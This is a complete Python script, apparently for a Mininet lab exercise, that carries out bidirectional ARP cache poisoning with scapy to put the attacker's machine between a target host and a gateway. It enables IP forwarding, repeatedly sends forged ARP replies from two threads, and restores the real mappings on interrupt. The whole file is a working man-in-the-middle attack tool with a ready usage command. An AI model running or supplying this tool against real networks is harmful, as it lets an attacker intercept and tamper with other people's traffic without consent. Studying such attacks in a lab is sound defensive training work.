#!/usr/bin/env python3
"""
ARP cache poisoning (bidirectional MITM) + also clean restauration at the end
to prove:
    sudo -E python3 arp_spoofing.py --target 10.1.0.2 --gateway 10.12.0.1 -i h1-eth0
"""
import argparse, os, signal, sys, threading, time
from scapy.all import ARP, Ether, send, getmacbyip, conf

conf.verb = 0   

def poison(victim_ip, victim_mac, spoof_ip, my_mac, interval):
    arp = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
              psrc=spoof_ip, hwsrc=my_mac)
    while True:
        send(arp, iface=ARGS.iface)
        time.sleep(interval)

def restore(victim_ip, victim_mac, real_ip, real_mac):
    arp = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
              psrc=real_ip, hwsrc=real_mac)

    for _ in range(5):
        send(arp, count=3, iface=ARGS.iface)
        time.sleep(0.3)

def enable_ip_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')

def disable_ip_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0')

def stop(sig, frame):
    print("\n[+] restauring ARP…")
    restore(ARGS.target, TARGET_MAC, ARGS.gateway, GATEWAY_MAC)
    restore(ARGS.gateway, GATEWAY_MAC, ARGS.target, TARGET_MAC)
    disable_ip_forwarding()
    sys.exit(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True, help='victim IP')
    parser.add_argument('--gateway', required=True, help='gateway/server IP')
    parser.add_argument('-i', '--iface', default=None, help='Interface (Mininet: hX-eth0)')
    parser.add_argument('--interval', type=float, default=2.0, help='seconds between ARP packets')
    ARGS = parser.parse_args()

    TARGET_MAC  = getmacbyip(ARGS.target)   or sys.exit("MAC victim not founded")
    GATEWAY_MAC = getmacbyip(ARGS.gateway)  or sys.exit("MAC gateway not founded")
    MY_MAC      = conf.iface.mac

    print(f"[+] poisoning {ARGS.target} <-> {ARGS.gateway} via {ARGS.iface or conf.iface}")
    enable_ip_forwarding()                       ### routing → MITM


    t1 = threading.Thread(target=poison,
                          args=(ARGS.target, TARGET_MAC, ARGS.gateway, MY_MAC, ARGS.interval),
                          daemon=True)
    t2 = threading.Thread(target=poison,
                          args=(ARGS.gateway, GATEWAY_MAC, ARGS.target, MY_MAC, ARGS.interval),
                          daemon=True)
    t1.start(); t2.start()

    signal.signal(signal.SIGINT, stop)
    print("[*] Ctrl‑C for restauring")
    signal.pause()
